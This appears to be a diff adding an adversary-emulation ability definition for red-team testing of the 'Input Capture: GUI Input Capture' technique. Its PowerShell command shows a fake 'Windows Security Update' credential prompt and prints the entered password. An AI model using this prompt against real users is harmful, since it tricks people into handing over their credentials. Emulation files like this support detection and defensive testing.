@@ -1,0 +1,24 @@
+---
+- id: 6f5096d87a8f9ac4c397215cb58cc978
+  name: PowerShell - Prompt User for Password
+  description: 'Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon
+    execution, a window will appear for the user to enter their credentials.
+
+
+    Reference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1056.002
+    name: 'Input Capture: GUI Input Capture'
+  platforms:
+    windows:
+      psh:
+        command: $cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName,
+          [Environment]::UserDomainName); write-warning $cred.GetNetworkCredential().Password
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
